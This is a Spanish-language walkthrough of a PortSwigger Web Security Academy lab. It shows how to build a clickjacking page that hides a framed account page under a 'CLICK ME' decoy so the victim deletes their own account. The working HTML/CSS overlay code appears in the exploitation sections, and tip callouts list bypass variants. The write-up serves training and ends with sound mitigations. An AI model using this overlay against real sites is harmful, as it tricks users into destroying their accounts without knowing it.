---
title: "Basic clickjacking with CSRF token protection"
platform: "PortSwigger"
os: "Windows"
difficulty: "Easy"
ip: "web-security-academy.net"
slug: "basic-clickjacking-with-csrf-token-protection"
author: "Z4k7"
date: "2026-10-16"
year: "2026"
status: "pwned"
tags:
  - "Clickjacking"
  - "CSRF"
  - "Web"
  - "UI_Redressing"
  - "target_website"
  - "decoy_website"
techniques:
  - "Clickjacking"
  - "iframe overlay"
  - "opacity manipulation"
tools:
  - "Exploit Server PortSwigger"
  - "Browser DevTools"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Laboratorio de BurpSuite Academy (Web Application, Easy) sobre clickjacking contra una función de eliminar cuenta protegida por token CSRF. La cadena de ataque: se incrusta /my-account en un iframe casi transparente (opacity 0.0001) sobre un div señuelo 'CLICK ME' alineado con el botón 'Delete account', se aloja el HTML en el Exploit Server y se entrega a la víctima. El token CSRF no frena el ataque porque la petición la realiza el navegador de la víctima desde el sitio legítimo, con su sesión y su token válidos.  ---"
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio incluye una función de inicio de sesión y un botón para eliminar la cuenta, protegidos por un token CSRF. El usuario deberá hacer clic en elementos que muestren la palabra "clic" en un sitio web señuelo.
          Para resolver el laboratorio, crea un código HTML que enmarque la página de la cuenta y engañe al usuario para que la elimine. El laboratorio se resuelve cuando se elimina la cuenta.
          Puedes iniciar sesión en tu cuenta utilizando las siguientes credenciales:`wiener:peter`

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          ingresamos en el laboratorio podemos validar que contamos con un login ingresamos con los datos suministrados en el objetivo.
      - kind: "image"
        src: "assets/images/Clickjacking%20básico%20con%20protección%20mediante%20token%20CSRF/file-20261019204852022.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          una vez ya contamos con el acceso en la web validamos el entorno del usuario
      - kind: "image"
        src: "assets/images/Clickjacking%20básico%20con%20protección%20mediante%20token%20CSRF/file-20261019205040656.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          validamos que contamos con un buttom el cual nos permite eliminar el usuario actual en este caso el objetivo es tratar que el usuario se auto elimine  din que pueda ver el cambio eso se logra manipulando el entorno de la web por medio de `iframe`
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Antes de armar el exploit valida la precondición real del ataque: que la página objetivo se pueda enmarcar. Abre DevTools → Network → recarga `/my-account` y revisa los *response headers*. Si no hay `X-Frame-Options` ni `Content-Security-Policy: frame-ancestors`, el sitio es enmarcable y el clickjacking es viable. Si los hay, ya sabes qué técnica de bypass buscar (ver el lab [[Clickjacking with a frame buster script]]). También confirma que el botón sea accionable con un solo clic: si requiere confirmación o varios pasos, vas por [[Multistep clickjacking]]."

  - id: "exploit"
    num: "03"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Procedemos con el llamado de la web por medio del apartado de iframe este código lo ingresamos atreves del apartado del servido adicionamos por el entorno  del laboratorio.
      - kind: "image"
        src: "assets/images/Clickjacking%20básico%20con%20protección%20mediante%20token%20CSRF/file-20261019205614276.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          ingresamos en el `servidor` y manipulamos el entorno  `Body:`
      - kind: "image"
        src: "assets/images/Clickjacking%20básico%20con%20protección%20mediante%20token%20CSRF/file-20261019205733978.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          `<iframe>`La etiqueta HTML especifica un marco en línea.
          Un marco en línea se utiliza para incrustar otro documento dentro del documento HTML actual.

  - id: "step4_1"
    num: "04"
    title: "Sintaxis"
    content:
      - kind: "code"
        lang: "HTML"
        code: |
          <iframe src="_url_" title="_description_"></iframe>
      - kind: "note"
        text: |
          Consejo: Es recomendable incluir siempre un `title`atributo para el iframe `<iframe>`. Esto lo utilizan los lectores de pantalla para leer el contenido del iframe.
          Con la información anterior tratamos de incrustar una web para validar su funcionamiento
      - kind: "code"
        lang: "HTML"
        code: |
          <iframe src="https://www.openstreetmap.org/export/embed.html?bbox=-0.004017949104309083%2C51.47612752641776%2C0.00030577182769775396%2C51.478569861898606&amp;layer=mapnik" style="height:200px;width:300px;" title="Iframe Example"></iframe>
      - kind: "image"
        src: "assets/images/Clickjacking%20básico%20con%20protección%20mediante%20token%20CSRF/file-20261019210556366.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          contamos como resultado
      - kind: "image"
        src: "assets/images/Clickjacking%20básico%20con%20protección%20mediante%20token%20CSRF/file-20261019210928213.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          una vez se confirma que contamos con la opción de incrustar una web procedemos con el proceso de ingresar la propia web del usuario victima .
      - kind: "code"
        lang: "HTML"
        code: |
          <head>
          	<style>
          		#target_website {
          			position:relative;
          			width:1570px;
          			height:1000px;
          			opacity:1;
          			z-index:2;
          			}
          		#decoy_website {
          			position:absolute;
          			width:300px;
          			height:400px;
          			z-index:1;
          			-webkit-border-radius: 25px;
          			-moz-border-radius: 25px;
          			border-radius: 25px;
          			-ms-touch-action: manipulation;
          			touch-action: manipulation;
          			-webkit-user-select: none;
          			-moz-user-select: none;
          			-ms-user-select: none;
          			user-select: none;
          			background-color: #159c80;
          			color: #fff;
          			font-size: 16px;
          			font-weight: bold;
          			padding: 7px 1em;
          			text-align: center;
          			text-decoration: none !important;
          			white-space: nowrap;
          			min-width: 120px;
          			}
          	</style>
          </head>
          <body>
          	<iframe id="target_website" src="https://0a170009039147b980ca8af700c400d0.web-security-academy.net/my-account?id=wiener">
          	</iframe>
          </body>
      - kind: "note"
        text: |
          el anterior código nos permite ingresar la web de la victima en este caso ya solo quedaría manipular o adicionar el botón para que la victima se ato elimine
      - kind: "image"
        src: "assets/images/Clickjacking%20básico%20con%20protección%20mediante%20token%20CSRF/file-20261019214151393.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          podemos ingresar en el apartado de inspeccionar de la web para copiar el stylo del botom
      - kind: "image"
        src: "assets/images/Clickjacking%20básico%20con%20protección%20mediante%20token%20CSRF/file-20261019214329718.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          style
      - kind: "code"
        lang: "CSS"
        code: |
          #decoy_website {
          			position: absolute;
          			top: 527px;
          			left: 218px;
          			width: 150;
          			z-index: 1;
          			border-radius: 25px;
          			-webkit-user-select: none;
          			background-color: #159c80;
          			color: #fff;
          			font-size: 16px;
          			font-weight: bold;
          			padding: 7px 1em;
          			text-align: center;
          			min-width: 120px;
          			}
      - kind: "note"
        text: |
          Ingresamos o incrustamos un buttom sobre el código original nos quedaría de la siguiente manera
      - kind: "image"
        src: "assets/images/Clickjacking%20básico%20con%20protección%20mediante%20token%20CSRF/file-20261019220246379.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          código
      - kind: "code"
        lang: "HTML"
        code: |
          <head>
          	<style>
          		#target_website {
          			position:relative;
          			width:1570px;
          			height:700px;
          			opacity:1;
          			z-index:2;
          			}
          		#decoy_website {
          			position: absolute;
          			top: 527px;
          			left: 218px;
          			width: 110px;
          			z-index: 1;
          			border-radius: 25px;
          			-webkit-user-select: none;
          			background-color: #159c80;
          			color: #fff;
          			font-size: 16px;
          			font-weight: bold;
          			padding: 7px 1em;
          			text-align: center;
          			min-width: 120px;
          			}
          	</style>
          </head>
          <body>
          <div id="decoy_website">CLICK ME</div>
          	<iframe id="target_website" src="https://0a5a00a104b06e3481e2983c00fe001f.web-security-academy.net/my-account?id=wiener">
          	</iframe>
          </body
      - kind: "image"
        src: "assets/images/Clickjacking%20básico%20con%20protección%20mediante%20token%20CSRF/file-20261019220315316.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/Clickjacking%20básico%20con%20protección%20mediante%20token%20CSRF/file-20261024181019661.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          enviamos el código a la victima para validar el comportamiento  desafortunadamente no se completa  el laboratorio validando el comportamiento para poder aplicar el cambio es necesario cambiar la opacidad del style del `iframe`  el cambioque aplicamos seria pasar de  una opacity:1 a una opacity:0.0001
          El error por el cual no se completa el laboratorio era una afectacion por la url que se envia al enviar la url con el apartado de  ?id= no permite completar se realiza la modificación en el HTML ya se evidencia el click por parte de la victima.
      - kind: "image"
        src: "assets/images/Clickjacking%20básico%20con%20protección%20mediante%20token%20CSRF/file-20261025163439195.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "¿Por qué el parámetro `?id=wiener` rompía el exploit?"
        text: "La víctima del lab navega con su propia sesión, que no es la de `wiener`. Al fijar `?id=wiener` en el `src` del iframe, la página de cuenta deja de comportarse como la cuenta de la víctima, así que el botón 'Delete account' no queda donde lo alineaste o no actúa sobre la sesión correcta. Al quitar el parámetro, el iframe carga `/my-account` tal cual y la víctima ve su propia cuenta. Lección: el exploit se prueba con tu usuario, pero debe construirse para el de la víctima."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Alternativas de explotación con el mismo fin: - Burp Clickbandit (en [[Burp Suite]]): graba tus clics sobre la página objetivo y genera automáticamente el HTML con el overlay. Ahorra el cálculo manual de `top`/`left`. - Probar con opacity 0.1 y luego bajar a 0.0001: así ves la alineación del señuelo con el botón real antes de ocultar la capa. - Sustituir `position:absolute` por `position:relative` con márgenes si el layout del señuelo es fluido, pero las coordenadas fijas son más predecibles. - Enmarcar con `sandbox='allow-forms allow-scripts'` cuando la página trae un frame buster (lab [[Clickjacking with a frame buster script]]). - Cursorjacking o drag & drop: variantes en las que el clic o el arrastre se redirige a otro elemento; útiles si el botón objetivo requiere más que un clic.  Detalles del código que conviene corregir en tu PoC: el `width: 150;` del bloque CSS no tiene unidad (`px`) y el navegador lo ignora, y el cierre `</body` del código final no lleva `>`. El navegador lo toleró, pero un HTML mal formado puede romper el exploit en otro contexto."

lessons:
  - 'Un token CSRF no protege contra el clickjacking: la acción la ejecuta el propio usuario autenticado desde el sitio legítimo, así que el token viaja válido en la petición.'
  - 'La precondición del ataque es que la página objetivo se pueda enmarcar, es decir, que no envíe encabezados anti-framing.'
  - 'El exploit se valida primero con una capa visible y la opacidad se reduce al final, para comprobar que el señuelo queda exactamente encima del botón real.'
  - 'Un parámetro extra en la URL del iframe puede cambiar lo que ve la víctima y romper la alineación. El exploit debe apuntar a la URL limpia de la página objetivo.'
  - 'Las coordenadas del señuelo se sacan inspeccionando el botón real en el navegador, y cualquier cambio en el tamaño de la ventana puede desalinearlas.'
  - 'Depurar un exploit que no funciona exige cambiar una sola variable a la vez, como hiciste con la opacidad y luego con la URL.'
mitigation:
  - 'Enviar el encabezado de respuesta X-Frame-Options con el valor deny o sameorigin en todas las páginas con acciones sensibles.'
  - 'Definir la directiva frame-ancestors en la Content Security Policy, que es la protección recomendada actualmente y más flexible que X-Frame-Options.'
  - 'Configurar las cookies de sesión con el atributo SameSite en Lax o Strict, de forma que el navegador no envíe la sesión dentro de un iframe de otro origen.'
  - 'Exigir confirmación adicional o reautenticación para acciones destructivas como eliminar una cuenta.'
  - 'No confiar en scripts de frame busting en el cliente como única defensa, porque se pueden neutralizar con el atributo sandbox del iframe.'
  - 'Aplicar defensa en profundidad combinando varias de las medidas anteriores, y probar los encabezados en cada despliegue.'
---
